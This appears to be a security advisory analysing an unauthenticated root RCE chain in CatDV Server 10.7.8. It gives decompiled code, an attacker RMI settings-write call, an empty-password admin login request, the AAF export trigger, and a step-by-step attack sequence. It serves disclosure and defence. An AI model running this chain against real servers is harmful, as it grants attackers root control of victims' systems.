# CatDV Server Unauthenticated RMI Root RCE - Technical Analysis

## Overview

CatDV Server 10.7.8 is a closed-source broadcast media asset management (MAM) server from Square Box Systems (UK; MAM business acquired by Quantum), built on Java 17 with an embedded Tomcat 9.0.106, an RMI registry on port 1099, a web/REST API on port 8181, and a MySQL backend. The server exposes two inbound services: `squarebox.catdv.server.rmiapi.RmiService` (the `ServerAPI` RMI interface on 1099) and the embedded Tomcat (`catdv.war`, REST `/catdv/api/*` plus RMI-over-HTTP `/catdv/rmi/*` on 8181). A three-defect chain turns an already-authorized deployment into an unauthenticated root RCE: (1) `ConnectionManager.connect(null, SConnection)` makes the server mint a `ClientID` using its own internal `client.regcode` system property, requiring zero attacker credentials; (2) `RmiService.saveSettings(ClientID, SSettings)` is gated only by a valid `ClientID` with no admin check, so the unauthenticated `ClientID` can write `catdv.aaftoolPath` into the type-23 server-config; (3) `AAFExportHandler.java:111` reads `catdv.aaftoolPath` on every AAF export request and `ProcessUtils.exec`s it as root. The chain is closed by the factory-default empty admin password (`create_catdv.sql:294`), which supplies the admin session needed to reach the AAF trigger. Dynamic verification produced `uid=0(root) gid=0(root)` written by the root-owned CatDV process.

## Architecture

```
L1 external access: RMI 1099 (squarebox.catdv.server.rmiapi.RmiService / ServerAPI) + Web 8181 (embedded Tomcat, catdv.war)
L2 boundary: plain TCP RMI on 1099; HTTP on 8181
L3 gateway: RmiService (RMI) + CatDVRestService (REST dispatch /catdv/api/*)
L4 auth: REST SessionHandler (JSESSIONID + catdv_authenticated_user cookie); RMI ClientID (ConnectionManager.connect)
L5 business: RmiService methods (performCommand/callRESTAPI/importCatalog/saveSettings/...) + REST handlers (ClipHandler/SettingsHandler/SessionHandler/AAFExportHandler)
L6 storage: MySQL (c_user / c_settings / c_clip / ...) + JVM System properties (catdv.*)
```

**RMI `ServerAPI` methods** split into two classes:
- **No `ClientID` required** (connect/getConnections/checkStatus/getProperty/getLastUpdateTime): do not reach the exec sink.
- **`ClientID`-gated** (performCommand/callRESTAPI/importCatalog/**saveSettings**/saveMediaStore): require a valid `ClientID`.

A `ClientID` is issued by `ConnectionManager.connect(user, SConnection)`. The prior stop-loss assumption was that `validateClientConnection`'s `new J(regCode).d()` RSA signature verification could not be forged, so no unauthenticated `ClientID` could exist and the RMI sinks were fully gated. This vulnerability overturns that assumption: the `allocateLicense` path uses the server's **own** regcode to mint a `ClientID`, bypassing the need to forge an RSA signature.

## Authentication Boundary

The two inbound ports and their auth models:

| Port | Service | Auth model |
|------|---------|------------|
| 1099 | RMI ServerAPI | ClientID (ConnectionManager.connect) |
| 8181 | REST /catdv/api/* | JSESSIONID + catdv_authenticated_user cookie (SessionHandler) |

REST `requiresIdentity` gates most handlers. `SessionHandler.processPost` (login) and a few others are `requiresIdentity=false`. The AAF export sink (`AAFExportHandler`) is reached via `GET /catdv/api/1/clips?fmt=aaf&clipListID=1`, which requires an admin session.

## Stage 1: Unauthenticated RMI `connect(null)` Mints a ClientID

### `ConnectionManager.allocateLicense` reads the server's own regcode

```java
// ConnectionManager.java L120-165 (CFR decompilation)
private String allocateLicense(SConnection sConnection) {
    String regCode = System.getProperty("client.regcode");   // the server's OWN system property
    if (regCode == null || regCode.length() == 0) return null;
    I i2 = new I(regCode, reguser);
    if (!i2.d()) return null;          // validates the regcode (the server's own, naturally valid)
    // ... license count check ...
    return regCode;                    // returns the server's internal regcode
}
```

`System.getProperty("client.regcode")` is the **server process's own** system property, set at authorized deployment time via `-Dclient.regcode=<license>` (every authorized deployment sets this). The attacker does not need to supply a regcode — the server uses its own internal regcode to pass validation.

### `ConnectionManager.connect` triggers `allocateLicense` on null credentials

```java
// ConnectionManager.java L175-228
public ClientID connect(String user, SConnection sConnection) {
    String[] arr = user == null ? null : new String[]{user};
    if ((arr == null || arr.length == 0)
        && (arr = this.allocateLicense(sConnection)) == null) {       // <- null user -> allocateLicense
        throw new RuntimeException("Client is not licensed");
    }
    String regCode = arr[0];
    ClientConnection conn = new ClientConnection(sConnection, regCode, ...);
    this.validateClientConnection(conn, regCode);                      // <- validated with the server's internal regcode
    return new ClientID(sConnection.user, conn.connectionID, ...);    // <- ClientID minted, no password check
}
```

### `validateClientConnection` passes RSA with the server's internal regcode

```java
// ConnectionManager.java L45-80 / L105
private void validateClientConnection(ClientConnection conn, String regCode) {
    if (regCode == null || regCode.length() == 0)
        throw new RuntimeException("You need a registered copy");
    J j2 = new J(regCode, null, false);
    if (!j2.d())                       // RSA signature check — the server's own regcode naturally passes
        throw new RuntimeException(j2.e());
    // ... no password check ...
}
```

**No password / no credential check at any point.** `connect(null, conn)` -> `allocateLicense` returns the server's internal regcode -> `validateClientConnection` passes -> a `ClientID` is minted.

### Dynamic proof (zero-credential ClientID)

```
[+] STAGE 1: unauth connect (NO PASSWORD) -> admin@1113321702
```

The attacker sends `connect(null, SConnection)` and the server returns `ClientID=admin@<connID>` without the attacker ever supplying a password or credential.

## Stage 1 (continued): Unauthenticated `saveSettings` Writes `aaftoolPath`

### `RmiService.saveSettings` is ClientID-gated only

```java
// RmiService.java L1525-1535 (CFR decompilation)
public int saveSettings(ClientID clientID, SSettings sSettings) {
    RmiRequestContext rmiRequestContext = this.getRequestContext(clientID);  // ClientID-gated ONLY
    this.logRequest(...);
    int n2 = z.a((DataContext)rmiRequestContext, sSettings);  // -> SettingsData.d -> DB write
    return n2;
}
```

`getRequestContext(clientID)` (L166-189) **only validates the `ClientID`; it does not check admin authorization**. The written type=23 (`TYPE_SERVER_SETTINGS`) "server-config" setting is applied verbatim as JVM system properties by `ServerSettings.loadSettingsFromDatabase` (L362-410), which iterates each key and calls `System.setProperty(key, value)` with **no whitelist** — any `catdv.*` property can be injected.

### Unauthenticated write

```java
// Attacker RMI call (using the unauthenticated ClientID)
SSettings s = new SSettings(0);
s.ID = -1;                              // force INSERT
s.type = SSettings.TYPE_SERVER_SETTINGS; // 23 = server-config
s.name = "server-config";
s.value = "{\"catdv.aaftoolPath\":\"/tmp/evil.sh\"}".getBytes("UTF-8");
s.userID = 0; s.groupID = 0;
int id = api.saveSettings(cid, s);      // cid = unauthenticated ClientID
```

Dynamic proof:
```
[+] STAGE 1: unauth saveSettings wrote aaftoolPath -> row id=130 (NO CREDENTIAL)
```

### Auto-apply (no restart needed)

`saveSettings` -> `CacheManager.a.a(dc, 1)` (cache set version 1) -> `checkCaches` on every subsequent request (1s throttle) -> `ServerSettings.reload` -> `loadSettingsFromDatabase` iterates keys and calls `System.setProperty`. Confirmed via unauthenticated RMI `getProperty`:
```
catdv.aaftoolPath = /tmp/evil.sh
```

## Stage 2: Factory-Default Empty Admin Password (VULN-001)

The AAF trigger requires an admin session. The factory-default DB seed `create_catdv.sql:294` provides one with no password:

```sql
INSERT INTO c_user VALUES(0,-1,'admin','Administrator',0,0,NULL,0);
--                          ^id ^grp ^name ^desc  ^pw ^hash ^...
-- password=0, passwordHash=NULL (factory default)
```

`Encryption.a("", null, 0)` skips PBKDF2 when `passwordHash==null` and falls back to the legacy `simpleMD5Hash` path: `simpleMD5Hash("")=0`, and `0 == 0` (storedPassword) -> true.

```java
public static boolean a(String password, String passwordHash, int storedPassword) {
    if (passwordHash != null && passwordHash.length() > 0) {
        // PBKDF2 path (factory default not set, skipped)
        ...
    }
    int n4 = simpleMD5Hash(password);      // simpleMD5Hash("") = 0
    return n4 == storedPassword;           // 0 == 0 -> true
}

public static int simpleMD5Hash(String s) {
    if (s == null || s.length() == 0) return 0;     // <- empty string returns 0
    ...
}
```

### Login request

```
POST /catdv/api/1/session HTTP/1.1
Content-Type: application/json
CatDV-Client: web

{"username":"admin","password":""}
```

Nashorn (removed in Java 17) breaks the JSON response body serialization -> HTTP 500, **but the `Set-Cookie` headers still prove the login succeeded** (cookies are set before body serialization):

```
HTTP/1.1 500
Set-Cookie: JSESSIONID=BDE2B824315859C730DB377D1FD13717; Path=/catdv; HttpOnly
Set-Cookie: catdv_authenticated_user=admin; Path=/catdv; HttpOnly
```

The `JSESSIONID` and `catdv_authenticated_user=admin` cookies are extracted from the `Set-Cookie` header (not the body). The HTTP 500 is a body-serialization failure, not a login failure.

## Stage 3: AAF Export Trigger Reaches `ProcessUtils.exec` (VULN-002)

### The exec sink

```java
// AAFExportHandler.java (CFR decompilation)
// L97 — read catdv.aaftoolPath system property on every request (attacker-controlled via saveSettings)
object4 = System.getProperty("catdv.aaftoolPath");
// L99-105 — verify the path exists and is executable
if (object4 == null || !new File(object4).exists()) {
    throw new RuntimeException("AAF tool not configured");
}
// L111 — ProcessUtils.exec with the server process privileges (root)
ai.a(new String[]{object4, "-ss", string, string2}, true);  // = ProcessUtils.exec
```

`ai.a(...)` is `squarebox.catdv.common.io.a.ai.a(cmd[], redirect)` -> `ProcessBuilder.start()`, which executes the script pointed to by `aaftoolPath` with the CatDV process privileges (root), followed by `-ss <xml> <aaf>` arguments.

### Empty clipList bypass

`AAFExportHandler.processRequest` calls `g.a(clips, ...)` (the AAFXMLExporter) **before** the `exportXML` check. If the clipList is non-empty, each clip's `getType()` (`Clip.java` L191-193) calls `typeForName(sClip.type)` when `typeID<=0`. A seed clip with `type=NULL` makes `typeForName("0")` throw `NoSuchElementException("Unknown type '0'")` (`Clip.java` L122), which blocks control flow from reaching the exec sink.

**Fix**: use an empty clipList (no `clipListMember` rows; `clipListID=1` but the list has no members) -> `g.a()` does not iterate an empty list -> no type check -> control flow reaches the L111 exec sink.

### Trigger request

```
GET /catdv/api/1/clips?fmt=aaf&clipListID=1 HTTP/1.1
CatDV-Client: web
Cookie: JSESSIONID=...; catdv_authenticated_user=admin
```

## Dynamic Verification

`server.log` (ProcessUtils.exec invocation evidence):
```
[41;12:47:22.559] exec: /tmp/evil.sh -ss /tmp/catdv8347596604326512916xml /tmp/catdv10089934903309826957aaf
```

marker (`/tmp/aaftool_rce.txt`, 36 bytes, root:root):
```
uid=0(root) gid=0(root) groups=0(root)
```

`/tmp/evil.sh` (chmod 755):
```sh
#!/bin/sh
id > /tmp/aaftool_rce.txt 2>&1
chmod 644 /tmp/aaftool_rce.txt 2>/dev/null
```

The CatDV server process runs as root; `ProcessUtils.exec` fork+execs `evil.sh` as root, so the marker is written by root.

## Exploitation Prerequisites (Honest Disclosure)

This is an unauthenticated RCE on any **already-authorized deployment**. The single precondition is the `client.regcode` system property (set via `-Dclient.regcode=<license>`), which every authorized deployment has. The attacker supplies zero credentials.

| Entry / condition | Default? | Notes |
|---|---|---|
| RMI 1099 reachable | yes (CatDV default listens on *:1099) | — |
| Web 8181 reachable | yes | — |
| `client.regcode` set | yes (authorized deployment) | the server uses its own internal regcode to mint the ClientID |
| admin empty password | yes (create_catdv.sql:294 factory default) | supplies the admin session for the AAF trigger |
| `saveSettings` ClientID-gated only | yes (no admin check) | — |
| `ServerSettings` no property whitelist | yes | — |
| `AAFExportHandler` exec | yes (L111 ProcessUtils.exec) | — |
| CatDV runs as root | deployment-dependent | the CatDV process privileges are the privileges gained |

**On deployments where the admin password has been changed**, Stage 1 still succeeds (the unauthenticated `saveSettings` write of `aaftoolPath` does not depend on admin), but Stage 2's AAF trigger requires an admin session, so the full root RCE requires the factory-default empty admin password or a known admin credential.

## Complete Attack Sequence

1. **Reach the unauthenticated RMI surface**: connect to RMI 1099 and look up `CatDVServer`.
2. **Mint a zero-credential ClientID**: call `connect(null, SConnection)` — `allocateLicense` reads the server's own `client.regcode` and the server mints `ClientID=admin@<connID>` with no password check.
3. **Write `aaftoolPath` unauthenticated**: call `saveSettings(cid, SSettings{type=23, name=server-config, value={"catdv.aaftoolPath":"/tmp/evil.sh"}})` — `getRequestContext` checks only the ClientID, no admin check; `CacheManager.checkCaches` auto-applies the property on the next request (1s throttle).
4. **Stage `/tmp/evil.sh`**: write a shell script that runs the attacker command and writes the output to a marker file; `chmod 755`.
5. **Login as admin with the factory-default empty password**: `POST /catdv/api/1/session {"username":"admin","password":""}` — extract `JSESSIONID` and `catdv_authenticated_user=admin` from the `Set-Cookie` header (HTTP 500 body is a Nashorn serialization failure, not a login failure).
6. **Trigger the AAF export**: `GET /catdv/api/1/clips?fmt=aaf&clipListID=1` with the admin cookie and an empty clipList — `AAFExportHandler.java:111` runs `ProcessUtils.exec("/tmp/evil.sh", "-ss", xml, aaf)` as root.
7. **Verify**: read the marker file — `uid=0(root) gid=0(root)` confirms root command execution.

## Key Technical Insights

1. **The server mints the ClientID with its own internal regcode**: `allocateLicense` reads `System.getProperty("client.regcode")` (the server's own system property, set on every authorized deployment) and returns it for `ClientID` issuance. `connect(null)` triggers this path, so an unauthenticated caller gets a valid `ClientID` without forging any RSA signature. This overturns the prior stop-loss assumption that the RSA signature on the regcode could not be forged.

2. **`saveSettings` is ClientID-gated only, no admin check**: `RmiRequestContext.getRequestContext` validates only the `ClientID`, not admin authorization. Any holder of a valid `ClientID` — including the unauthenticated one — can write `type=23` server-config settings.

3. **No property whitelist on `System.setProperty`**: `ServerSettings.loadSettingsFromDatabase` iterates each key in the server-config JSON and calls `System.setProperty(key, value)` verbatim. Any `catdv.*` property can be injected, including the exec-path properties `aaftoolPath`, `ffmpegPath`, `libreOfficePath`.

4. **The exec sink reads a mutable system property on every request**: `AAFExportHandler.java:97` reads `catdv.aaftoolPath` fresh on each AAF export, and L111 `ProcessUtils.exec`s it as root. Combined with the auto-apply (no restart needed), the property injection takes effect within the 1s `checkCaches` throttle.

5. **Empty clipList bypasses the type check**: a non-empty clipList triggers `typeForName("0")` which throws and blocks the exec sink; an empty clipList skips iteration and reaches L111.

6. **Factory-default empty admin password closes the chain**: `create_catdv.sql:294` seeds `admin` with `password=0, passwordHash=NULL`; `Encryption.a` falls back to `simpleMD5Hash("")=0 == 0`. The Nashorn-induced HTTP 500 breaks only the response body, not the `Set-Cookie` headers that prove the login.

## Credits

Discovered by 0day Rubbish Project using automated AI vulnerability research with multi-LLM ensemble (Claude, OpenAI, DeepSeek, GLM).

---

*Disclaimer: This research was conducted for defensive purposes. Always obtain proper authorization before testing systems you don't own. Responsible disclosure practices apply.*
